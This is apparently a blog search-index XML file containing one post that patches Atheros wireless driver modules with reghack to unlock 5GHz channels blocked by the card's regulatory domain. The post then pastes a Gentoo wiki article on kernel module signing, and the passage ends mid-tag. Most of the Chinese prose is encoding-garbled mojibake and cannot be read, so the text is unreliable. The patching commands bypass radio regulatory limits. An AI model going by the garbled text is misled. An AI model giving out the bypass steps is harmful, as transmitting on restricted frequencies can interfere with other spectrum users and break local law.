<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ä¿®æ”¹ç½‘å¡åœ°åŸŸé™åˆ¶</title>
      <link href="/2021/05/20/%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%9C%B0%E5%9F%9F%E9%99%90%E5%88%B6/"/>
      <url>/2021/05/20/%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%9C%B0%E5%9F%9F%E9%99%90%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸»è¦ä»‹ç»äº†åœ¨æ„å»ºè·¯ç”±å™¨æ—¶ä¸ºäº†ç ´è§£åœ°åŸŸé™åˆ¶çš„é€‰è·¯æœºåˆ¶çš„ç›¸å…³å·¥ä½œã€</p><a id="more"></a> <h1 id="ç ´è§£ç½‘å¡çš„-Regulatory-Domain"><a href="#ç ´è§£ç½‘å¡çš„-Regulatory-Domain" class="headerlink" title="ç ´è§£ç½‘å¡çš„ Regulatory Domain"></a>ç ´è§£ç½‘å¡çš„ Regulatory Domain</h1><p>æˆ‘ä»¬ç½‘å¡çš„ ç‰ˆæœ¬å·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Network controller: Qualcomm Atheros AR958x 802.11abgn Wireless Network Adapter (rev 01)</span><br></pre></td></tr></table></figure><p>[TOC]</p><h2 id="åˆ©ç”¨-reghack-ä¿®æ”¹å†…æ ¸æ¨¡å—"><a href="#åˆ©ç”¨-reghack-ä¿®æ”¹å†…æ ¸æ¨¡å—" class="headerlink" title="åˆ©ç”¨ reghack ä¿®æ”¹å†…æ ¸æ¨¡å—"></a>åˆ©ç”¨ reghack ä¿®æ”¹å†…æ ¸æ¨¡å—</h2><blockquote><p>æ›¾ç»çš„ä¸€ä¸ªæ•™ç¨‹</p></blockquote><p>ä¸åŒçš„å›½å®¶å’Œåœ°åŒºæœ‰ä¸åŒçš„æ— çº¿ç”µç®¡ç†è§„å®š(Regulatory Domain)ï¼Œå¯¹äºISM 5GHzé¢‘æ®µçš„åˆ’åˆ†ä¹Ÿæœ‰ä¸åŒçš„å‡†åˆ™ã€‚</p><p>Regulatory Domianæœ‰3å¤§æ—ï¼Œä»¥ç¾å›½ä¸ºä»£è¡¨çš„FCCï¼Œä»¥æ¬§ç›Ÿä¸ºä»£è¡¨çš„ETSIï¼Œä»¥åŠæ—¥æœ¬å†ä¸€æ¬¡ç‰¹ç«‹ç‹¬è¡Œçš„TELECï¼ˆæ— è®ºåœ¨èœ‚çªç½‘è¿˜æ˜¯WLANï¼Œæ—¥æœ¬ä¸€ç›´éƒ½æ˜¯ä¸ªæ€ªå¼‚çš„å­˜åœ¨ï¼‰ã€‚ä¸­å›½é‡‡ç”¨ETSIè§„å®šï¼Œå…·ä½“é¢‘æ®µç®¡ç†ä¸æ¬§ç›Ÿæœ‰æ‰€ä¸åŒã€‚</p><p>æ— çº¿ç½‘å¡é©±åŠ¨æ ¹æ®ISO-3166 alpha2è§„å®šçš„å›½å®¶ä»£ç ï¼ˆå¦‚ç¾å›½USï¼Œä¸­å›½CNï¼Œå¾·å›½DEï¼ŒéŸ©å›½KRï¼Œæ—¥æœ¬JPï¼‰ï¼Œå¯¹ç½‘å¡çš„å·¥ä½œé¢‘ç‡è¿›è¡Œç®¡ç†ã€‚</p><p>é«˜é€šAtherosåœ¨ç½‘å¡é©±åŠ¨çš„å…¬å…±éƒ¨åˆ†åŠ å…¥äº†Regulatory Doaminç®¡ç†çš„åŠŸèƒ½ã€‚é’ˆå¯¹é”€å¾€ä¸åŒå›½å®¶çš„ç½‘å¡äº§å“ï¼Œé€šè¿‡ç›´æ¥åœ¨ç½‘å¡èŠ¯ç‰‡çš„å¯æ“¦å†™å­˜å‚¨å™¨ï¼ˆEEPROMï¼‰ä¸­å†™å…¥ç›¸åº”çš„å›½å®¶ä»£ç ï¼Œé©±åŠ¨å·¥ä½œæ—¶è¯»å–è¯¥ä»£ç å¹¶å¼€å¯ç›¸åº”çš„å·¥ä½œé¢‘æ®µã€‚</p><p>ç”±äºé¡¹ç›®çš„éœ€æ±‚ï¼Œæˆ‘ä»¬ä¹°äº†å‡ å¼ Atheros 958xç³»åˆ—çš„æ— çº¿ç½‘å¡ï¼Œæ”¯æŒ2.4/5GHzåŒé¢‘æ®µï¼Œä½†æ˜¯å¾ˆé—æ†¾çš„æ˜¯è¿™æ‰¹ç½‘å¡5GHzçš„ä¸­é—´ä¸€æ®µä¸è¢«æ”¯æŒã€‚å›½å®¶ä»£ç å¯ä»¥é€šè¿‡ä¸‹åˆ—å‘½ä»¤å¯Ÿçœ‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ dmesg | grep ath</span><br><span class="line">$ iwlist chan</span><br></pre></td></tr></table></figure><p>å°½ç®¡ä½¿ç”¨äº†iwå·¥å…·æ¥ä¿®æ”¹linuxç³»ç»Ÿçš„Regulatory Domainç®¡ç†éƒ¨åˆ†çš„å›½å®¶ä»£ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ iw reg <span class="built_in">set</span> US</span><br><span class="line">$ iw reg get</span><br><span class="line">$ iwlist chan</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç”±äºEEPROMçš„é™åˆ¶ï¼Œè¢«å±è”½çš„é¢‘æ®µæ€»æ˜¯æ— æ³•å¼€å¯ã€‚</p><p>ä¸ºäº†å¼€å¯å°½å¯èƒ½å¤šçš„5GHzé¢‘æ®µï¼Œåœ¨æ²¡æœ‰ç›´æ¥ä¿®æ”¹EEPROMçš„æ–¹æ³•çš„æƒ…å†µä¸‹ï¼Œæˆ‘åªèƒ½ä¿®æ”¹ç ´è§£é©±åŠ¨ä¸­å…³äºé¢‘æ®µç®¡ç†çš„éƒ¨åˆ†ã€‚Google åˆ°<a href="https://github.com/Luminger/reghack">reghackåŠå…¶æºä»£ç </a>ï¼Œå¹¶è¿›è¡Œé‡æ–°ç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@linux: gcc reghack.c -o reghack</span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰gcc è¿™æ ·å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential</span><br></pre></td></tr></table></figure><p>å®‰è£…çš„Ubuntu 12.04.4ç³»ç»Ÿæ˜¯linux 3.11å†…æ ¸ï¼Œlinux 3.7 å†…æ ¸å¼€å§‹åŠ å…¥äº†æ¨¡å—ç­¾ååŠéªŒè¯æœºåˆ¶ã€‚ä¸‹é¢çš„ç ´è§£è¿‡ç¨‹è™½ç„¶é¡ºåˆ©è¿›è¡Œï¼Œä½†é‡å¯ä¹‹åç ´è§£çš„æ— çº¿æ¨¡å—cfg80211.koå’Œath.koæ— æ³•åŠ è½½ï¼Œç½‘å¡ä¸èƒ½é©±åŠ¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@linux:/home/user<span class="comment"># ./reghack /lib/modules/3.11.0-15-generic/kernel/net/wireless/cfg80211.ko </span></span><br><span class="line">Patching @ 0x0004cf30: core world6 regdomain <span class="keyword">in</span> cfg80211/reg.o</span><br><span class="line">root@linux:/home/user<span class="comment"># ./reghack /lib/modules/3.11.0-15-generic/kernel/drivers/net/wireless/ath/ath.ko </span></span><br><span class="line">Patching @ 0x00002110: ath world regdomain with 5 rules <span class="keyword">in</span> ath/regd.o</span><br><span class="line">Patching @ 0x000021a0: ath world regdomain with 4 rules <span class="keyword">in</span> ath/regd.o</span><br><span class="line">Patching @ 0x00002220: ath world regdomain with 3 rules <span class="keyword">in</span> ath/regd.o</span><br><span class="line">Patching @ 0x00002280: ath world regdomain with 3 rules <span class="keyword">in</span> ath/regd.o</span><br><span class="line">Patching @ 0x000022e0: ath world regdomain with 4 rules <span class="keyword">in</span> ath/regd.o</span><br></pre></td></tr></table></figure><h4 id="é™å›åˆ°linux-3-2å†…æ ¸"><a href="#é™å›åˆ°linux-3-2å†…æ ¸" class="headerlink" title="é™å›åˆ°linux 3.2å†…æ ¸"></a>é™å›åˆ°linux 3.2å†…æ ¸</h4><p>å¦‚æœä½ çš„å†…æ ¸ç‰ˆæœ¬é»˜è®¤å°±æ˜¯ä½äº3.7å†…æ ¸ï¼Œå°±æ— éœ€è¿›è¡Œæ­¤æ“ä½œã€‚å†…æ ¸ç‰ˆæœ¬å¯Ÿçœ‹å‘½ä»¤ <code>uname -a</code>,ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ <code>sudo apt-get install linux-image</code> å°†linux 3.2å†…æ ¸åŠæºç ç­‰è‡ªåŠ¨ä¸‹è½½å®‰è£…ã€‚é‡å¯é€‰æ‹©<code>Prevous Linux Versions</code>è¿›å…¥ï¼Œç„¶åé€‰æ‹©å¯ç”¨3.2å†…æ ¸ã€‚ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå…ˆè¿›è¡Œå¤‡ä»½å¤„ç†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">user@linux:~$ gcc reghack.c -o reghack</span><br><span class="line">user@linux:~$ sudo cp /lib/modules/3.2.0-60-generic/kernel/net/wireless/cfg80211.ko /lib/modules/3.2.0-60-generic/kernel/net/wireless/cfg80211.ko.backup</span><br><span class="line">user@linux:~$ sudo cp /lib/modules/3.2.0-60-generic/kernel/drivers/net/wireless/ath/ath.ko /lib/modules/3.2.0-60-generic/kernel/drivers/net/wireless/ath/ath.ko.backup</span><br><span class="line">user@linux:~$ sudo ./reghack /lib/modules/3.2.0-60-generic/kernel/drivers/net/wireless/ath/ath.ko</span><br><span class="line">Patching @ 0x00001e10: ath world regdomain with 5 rules <span class="keyword">in</span> ath/regd.o</span><br><span class="line">Patching @ 0x00001e90: ath world regdomain with 4 rules <span class="keyword">in</span> ath/regd.o</span><br><span class="line">Patching @ 0x00001ef8: ath world regdomain with 3 rules <span class="keyword">in</span> ath/regd.o</span><br><span class="line">Patching @ 0x00001f48: ath world regdomain with 3 rules <span class="keyword">in</span> ath/regd.o</span><br><span class="line">Patching @ 0x00001f98: ath world regdomain with 4 rules <span class="keyword">in</span> ath/regd.o</span><br><span class="line">user@linux:~$ sudo ./reghack /lib/modules/3.2.0-60-generic/kernel/net/wireless/cfg80211.ko</span><br><span class="line">Patching @ 0x00022c60: core world5 regdomain <span class="keyword">in</span> cfg80211/reg.o</span><br></pre></td></tr></table></figure><p>ç ´è§£åçš„é¢‘æ®µè§å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">wlan0     32 channels <span class="keyword">in</span> total; available frequencies :</span><br><span class="line">          Channel 01 : 2.412 GHz</span><br><span class="line">          Channel 02 : 2.417 GHz</span><br><span class="line">          Channel 03 : 2.422 GHz</span><br><span class="line">          Channel 04 : 2.427 GHz</span><br><span class="line">          Channel 05 : 2.432 GHz</span><br><span class="line">          Channel 06 : 2.437 GHz</span><br><span class="line">          Channel 07 : 2.442 GHz</span><br><span class="line">          Channel 08 : 2.447 GHz</span><br><span class="line">          Channel 09 : 2.452 GHz</span><br><span class="line">          Channel 10 : 2.457 GHz</span><br><span class="line">          Channel 11 : 2.462 GHz</span><br><span class="line">          Channel 36 : 5.18 GHz</span><br><span class="line">          Channel 40 : 5.2 GHz</span><br><span class="line">          Channel 44 : 5.22 GHz</span><br><span class="line">          Channel 48 : 5.24 GHz</span><br><span class="line">          Channel 52 : 5.26 GHz</span><br><span class="line">          Channel 56 : 5.28 GHz</span><br><span class="line">          Channel 60 : 5.3 GHz</span><br><span class="line">          Channel 64 : 5.32 GHz</span><br><span class="line">          Channel 100 : 5.5 GHz</span><br><span class="line">          Channel 104 : 5.52 GHz</span><br><span class="line">          Channel 108 : 5.54 GHz</span><br><span class="line">          Channel 112 : 5.56 GHz</span><br><span class="line">          Channel 116 : 5.58 GHz</span><br><span class="line">          Channel 132 : 5.66 GHz</span><br><span class="line">          Channel 136 : 5.68 GHz</span><br><span class="line">          Channel 140 : 5.7 GHz</span><br><span class="line">          Channel 149 : 5.745 GHz</span><br><span class="line">          Channel 153 : 5.765 GHz</span><br><span class="line">          Channel 157 : 5.785 GHz</span><br><span class="line">          Channel 161 : 5.805 GHz</span><br><span class="line">          Channel 165 : 5.825 GHz</span><br><span class="line">          Current Frequency:2.437 GHz (Channel 6)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç¼–è¯‘å†…æ ¸æ¨¡å—"><a href="#ç¼–è¯‘å†…æ ¸æ¨¡å—" class="headerlink" title="ç¼–è¯‘å†…æ ¸æ¨¡å—"></a>ç¼–è¯‘å†…æ ¸æ¨¡å—</h2><p>linuxå†…æ ¸ä»3.7 å¼€å§‹åŠ å…¥æ¨¡å—ç­¾åæ£€æŸ¥æœºåˆ¶ï¼Œå¦‚æœå†…æ ¸é€‰é¡¹CONFIG_MODULE_SIGå’ŒCONFIG_MODULE_SIG_FORCEæ‰“å¼€çš„è¯ï¼Œå½“åŠ è½½æ¨¡å—æ—¶å†…æ ¸ä¼šæ£€æŸ¥æ¨¡å—çš„ç­¾åï¼Œå¦‚æœç­¾åä¸å­˜åœ¨æˆ–è€…ç­¾åå†…å®¹ä¸ä¸€è‡´ï¼Œä¼šå¼ºåˆ¶é€€å‡ºæ¨¡å—çš„åŠ è½½ã€‚æ‰€ä»¥ä¸ºæ¨¡å—ç­¾åå°±å°¤ä¸ºé‡è¦ã€‚å¦‚æœæ˜¯å†…æ ¸é€‰é¡¹CONFIG_MODULE_SIG_ALLæ‰“å¼€ï¼Œå†…æ ¸ç¼–è¯‘æ¨¡å—æ—¶ä¼šè‡ªåŠ¨ä¸ºæ¨¡å—ç­¾åã€‚å¦åˆ™å°±è¦è‡ªå·±å¯¹æ¨¡å—ç­¾åã€‚</p><p>é¦–å…ˆæˆ‘ä»¬å°±è¦æƒ³åˆ°ç”¨ä»€ä¹ˆç­¾åå·¥å…·ï¼Œå› ä¸ºç­¾åæœºåˆ¶ä»3.7 å†…æ ¸æ‰åŠ å…¥ï¼Œæ‰€ä»¥ä¸ºæ¨¡å—ç­¾åçš„èµ„æ–™å°‘ä¹‹åˆå°‘ï¼Œæˆ‘æ‰¾äº†å¾ˆé•¿æ—¶é—´ä¹Ÿæ²¡æœ‰å¤´ç»ªï¼Œç½‘ä¸Šè¯´çš„æœ€å¤šçš„éƒ½æ˜¯opensslæ¥åšç­¾åã€‚æ‰€ä»¥ç†æ‰€å½“ç„¶çš„æˆ‘ä¹Ÿä½¿ç”¨opensslæ¥åšç­¾åï¼Œä½†æ˜¯å®ƒæ˜¯linuxå†…æ ¸ä¹‹å¤–çš„å·¥å…·ï¼Œå°±ç®—ç”Ÿæˆç­¾åï¼Œä½ è¿˜è¦æ‰‹åŠ¨æ·»åŠ åˆ°æ¨¡å—.koæ–‡ä»¶æœ€åï¼Œè¿˜è¦è®¾ç½®ä¸€äº›å†…æ ¸è¦æ£€æŸ¥çš„å›ºå®šç»“æ„ä½“(ä¾‹å¦‚ï¼šsignature_moduleç»“æ„)ï¼Œå¾ˆæ˜¯éº»çƒ¦ï¼Œå¹¶ä¸”å†…æ ¸çš„keyä½ æ‹¿ä¸åˆ°ï¼Œç”¨çš„ä¸æ˜¯å†…æ ¸çš„å¯ä»¥ç­¾åè‚¯å®šé€šä¸è¿‡æ£€æŸ¥ã€‚æ‰€ä»¥è¿™ç§æ–¹æ³•è‡³å°‘æˆ‘è®¤ä¸ºä¸å¯è¡Œã€‚</p><p>æœ‰ä¸€ç¯‡è‹±æ–‡èµ„æ–™æ¯”è¾ƒå¥½</p><h3 id="Signed-kernel-module-support"><a href="#Signed-kernel-module-support" class="headerlink" title="Signed kernel module support"></a>Signed kernel module support</h3><p>From Gentoo Wiki</p><p>Jump to: <a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#mw-navigation">navigation</a>, <a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#p-search">search</a></p><p>Since Linux kernel version 3.7 onwards, support has been added for signed kernel modules. When enabled, the Linux kernel will only load kernel modules that are digitally signed with the proper key. This allows further hardening of the system by disallowing unsigned kernel modules, or kernel modules signed with the wrong key, to be loaded. Malicious kernel modules are a common method for loading rootkits on a Linux system.</p><p>Contents [<a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#">hide</a>] <a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Enabling_module_signature_verification">1 Enabling module signature verification</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Configuring_module_signature_verification">1.1 Configuring module signature verification</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Building_the_kernel_with_proper_keys">1.2 Building the kernel with proper keys</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Validating_module_signature_support">1.3 Validating module signature support</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Administering_kernel_module_signatures">2 Administering kernel module signatures</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Protecting_the_private_key">2.1 Protecting the private key</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Manually_signing_modules">2.2 Manually signing modules</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Distributing_the_kernel_and_modules">2.3 Distributing the kernel and modules</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#More_resources">3 More resources</a></p><h3 id="Enabling-module-signature-verification"><a href="#Enabling-module-signature-verification" class="headerlink" title="Enabling module signature verification"></a>Enabling module signature verification</h3><p>Enabling support is a matter of toggling a few settings in the Linux kernel configuration. Unless you want to use your own keypair, this is all that has to be done to enable kernel module support.</p><h4 id="Configuring-module-signature-verification"><a href="#Configuring-module-signature-verification" class="headerlink" title="Configuring module signature verification"></a>Configuring module signature verification</h4><p>Module signature verification is a kernel feature, so has to be enabled through the Linux kernel configuration. You can find the necessary options under Enable loadable module support.</p><p> [<a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#">Collapse</a>] </p><p>Kernel configuration Enable module signature verification</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--- Enable loadable module support</span><br><span class="line">[*]   Module signature verification</span><br><span class="line">[*]     Require modules to be validly signed</span><br><span class="line">[*]     Automatically sign all modules</span><br><span class="line">      Which hash algorithm should modules be signed with? (Sign modules with SHA-512) ---&gt;</span><br></pre></td></tr></table></figure><p>The option Module signature verification (CONFIG_MODULE_SIG) enables the module signature verification in the Linux kernel. It supports two approaches on signed module support: a rather permissive one and a strict one. By default, the permissive approach is used, which means that the Linux kernel module either has to have a valid signature, or no signature. With the strict approach, a valid signature must be present. In the above example, the strict approach is used by selecting Require modules to be validly signed (CONFIG_MODULE_SIG_FORCE). Another way of enabling this strict approach is to set the kernel boot option enforcemodulesig=1.</p><p>When building the Linux kernel, the kernel modules will not be signed automatically unless you select Automatically sign all modules(CONFIG_MODULE_SIG_ALL).</p><p>Finally, we need to select the hash algorithm to use with the cryptographic signature. In the above example, we use SHA-512.</p><h4 id="Building-the-kernel-with-proper-keys"><a href="#Building-the-kernel-with-proper-keys" class="headerlink" title="Building the kernel with proper keys"></a>Building the kernel with proper keys</h4><p>When the Linux kernel is building with module signature verification support enabled, then you can use your own keys or have the Linux kernel build infrastructure create a set for you. If you want the Linux kernel build infrastructure to create it for you, just continue as you always do with a make and make modules_install. At the end of the build process, you will notice that signing_key.priv and signing_key.x509 will be available on the root of the Linux kernel sources.</p><p>If we want to use our own keys, you can use openssl to create a key pair (private key and public key). The following command, taken from kernel/Makefile, creates such a key pair.</p><p> [<a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#">Collapse</a>] </p><p>File x509.genkey Key generation configuration file</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[ req ]</span><br><span class="line">default_bits &#x3D; 4096</span><br><span class="line">distinguished_name &#x3D; req_distinguished_name</span><br><span class="line">prompt &#x3D; no</span><br><span class="line">string_mask &#x3D; utf8only</span><br><span class="line">x509_extensions &#x3D; myexts</span><br><span class="line">  </span><br><span class="line">[ req_distinguished_name ]</span><br><span class="line">O &#x3D; GenFic</span><br><span class="line">CN &#x3D; Kernel Signing Key</span><br><span class="line">emailAddress &#x3D; server.support@genfic.com</span><br><span class="line">  </span><br><span class="line">[ myexts ]</span><br><span class="line">basicConstraints&#x3D;critical,CA:FALSE</span><br><span class="line">keyUsage&#x3D;digitalSignature</span><br><span class="line">subjectKeyIdentifier&#x3D;hash</span><br><span class="line">authorityKeyIdentifier&#x3D;keyid</span><br></pre></td></tr></table></figure><p><strong>user $</strong> openssl req -new -nodes -utf8 -sha512 -days 36500 -batch -x509 -config x509.genkey -outform DER -out signing_key.x509 -keyout signing_key.priv</p><p>The resulting files need to be stored as signing_key.x509 and signing_key.priv in the root of the Linux kernel source tree.</p><p>The public key part will be build inside the Linux kernel. If you configured the kernel to sign modules, this signing will take place during the make modules_install part.</p><h4 id="Validating-module-signature-support"><a href="#Validating-module-signature-support" class="headerlink" title="Validating module signature support"></a>Validating module signature support</h4><p>Reboot with the newly configured kernel. In the output of dmesg you should be able to confirm that the proper certificate is loaded:</p><p><strong>user $</strong> dmesg | grep MODSIGN</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[    2.450021] MODSIGN: Loaded cert &#39;GenFic: Kernel Signing Key: b923a5f44eae25bbad52c8bf2742e7b7e6fb0c0e&#39;</span><br></pre></td></tr></table></figure><p>The kernel modules have the digital signature appended at the end. A simple hexdump can confirm if a signature is present or not:</p><p><strong>user $</strong> hexdump -C vxlan.ko | tail</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00008880  cf 0e e7 cb 10 9e 98 5f  4b 21 d4 03 ba 3d 7e e7  |......._K!...&#x3D;~.|</span><br><span class="line">00008890  68 db f9 e3 5f 62 3c c7  d6 6c 84 c7 d6 68 c1 73  |h..._b&lt;..l...h.s|</span><br><span class="line">000088a0  3d d7 5a 38 66 99 12 b8  84 c9 84 45 dd 68 6d 17  |&#x3D;.Z8f......E.hm.|</span><br><span class="line">000088b0  03 24 dc 9c 6f 6d 11 01  e9 74 82 ea b5 5b 46 07  |.$..om...t...[F.|</span><br><span class="line">000088c0  fe dd 66 97 1a 33 58 3d  6e d0 ac 03 08 16 73 06  |..f..3X&#x3D;n.....s.|</span><br><span class="line">000088d0  9f 90 c4 eb b3 82 1d 9f  48 8c 5b 51 01 06 01 1e  |........H.[Q....|</span><br><span class="line">000088e0  14 00 00 00 00 00 02 02  7e 4d 6f 64 75 6c 65 20  |........~Module |</span><br><span class="line">000088f0  73 69 67 6e 61 74 75 72  65 20 61 70 70 65 6e 64  |signature append|</span><br><span class="line">00008900  65 64 7e 0a                                       |ed~.|</span><br><span class="line">00008904</span><br></pre></td></tr></table></figure><p>The string <del>Module signature appended</del> at the end confirms that a signature is present. Of course, it does not confirm that the signature is valid or not.</p><p>To remove the signature, we can use the strip command:</p><p><strong>root #</strong> strip â€“strip-debug vxlan.ko<br><strong>root #</strong> hexdump -C vxlan.ko | tail</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00097330  6c 5f 67 65 74 5f 73 74  61 74 73 36 34 00 72 63  |l_get_stats64.rc|</span><br><span class="line">00097340  75 5f 62 61 72 72 69 65  72 00 5f 72 61 77 5f 73  |u_barrier._raw_s|</span><br><span class="line">00097350  70 69 6e 5f 75 6e 6c 6f  63 6b 00 72 65 67 69 73  |pin_unlock.regis|</span><br><span class="line">00097360  74 65 72 5f 70 65 72 6e  65 74 5f 64 65 76 69 63  |ter_pernet_devic|</span><br><span class="line">00097370  65 00 6b 6d 61 6c 6c 6f  63 5f 63 61 63 68 65 73  |e.kmalloc_caches|</span><br><span class="line">00097380  00 6e 65 74 64 65 76 5f  69 6e 66 6f 00 6e 65 69  |.netdev_info.nei|</span><br><span class="line">00097390  67 68 5f 6c 6f 6f 6b 75  70 00 72 65 6c 65 61 73  |gh_lookup.releas|</span><br><span class="line">000973a0  65 5f 73 6f 63 6b 00 72  65 67 69 73 74 65 72 5f  |e_sock.register_|</span><br><span class="line">000973b0  6e 65 74 64 65 76 69 63  65 00                    |netdevice.|</span><br><span class="line">000973ba</span><br></pre></td></tr></table></figure><p>If we try to load this module now, we get a failure:</p><p><strong>root #</strong> modprobe vxlan</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modprobe: ERROR: could not insert &#39;vxlan&#39;: Required key not available</span><br></pre></td></tr></table></figure><p>This confirms that modules without a signature are not loaded.</p><h3 id="Administering-kernel-module-signatures"><a href="#Administering-kernel-module-signatures" class="headerlink" title="Administering kernel module signatures"></a>Administering kernel module signatures</h3><p>Once the kernel boots and we have validated that the signed kernel module support works, it is important to correctly handle the keys themselves.</p><h4 id="Protecting-the-private-key"><a href="#Protecting-the-private-key" class="headerlink" title="Protecting the private key"></a>Protecting the private key</h4><p>The private key, stored as signing_key.priv, needs to be moved to a secure location (unless you will be creating new keys for new kernels, in which case the file can be removed). Do not keep it at /usr/src/linux on production systems as malware can then easily use this key to sign the malicious kernel modules (such as rootkits) and compromise the system further.</p><h4 id="Manually-signing-modules"><a href="#Manually-signing-modules" class="headerlink" title="Manually signing modules"></a>Manually signing modules</h4><p>If you ever need to manually sign a kernel module, you can use the scripts/sign-file script available in the Linux kernel source tree. It requires four arguments:</p><ol><li>The hash algorithm to use, such as sha512</li><li>The private key location</li><li>The certificate (which includes the public key) location</li><li>The kernel module to sign</li></ol><p>In this case, the key pair does not need to be named signing_file.priv and such, nor do they need to be in the root of the Linux kernel source tree location.</p><p><strong>user $</strong> perl /usr/src/linux/scripts/sign-file sha512 /mnt/sdcard/kernel-signkey.priv /mnt/sdcard/kernel-signkey.x509 vxlan.ko</p><h4 id="Distributing-the-kernel-and-modules"><a href="#Distributing-the-kernel-and-modules" class="headerlink" title="Distributing the kernel and modules"></a>Distributing the kernel and modules</h4><p>If we create a kernel package through make tarbz2-pkg, the modules in it will be signed already so we do not need to manually sign them afterwards. The signing keys themselves are not distributed with it.</p><h4 id="More-resources"><a href="#More-resources" class="headerlink" title="More resources"></a>More resources</h4><p>In <a href="http://www.kroah.com/log/blog/2013/09/02/booting-a-self-signed-linux-kernel/">Booting a self-signed Linux kernel</a> Greg Kroah-Hartman describes how to boot a self-signed Linux kernel from EFI. As having signed kernel module support is only secure if the Linux kernel is trusted, this is an important (and related) feature to work with.</p><p>ä¸€ä¸ªå…³é—­ç­¾åçš„æ¡ˆä¾‹ï¼š</p><p><img src="https://img-blog.csdn.net/20170308151344817?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZWxpb3Rfc2hhbw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><h3 id="é¢ä¸´çš„é—®é¢˜"><a href="#é¢ä¸´çš„é—®é¢˜" class="headerlink" 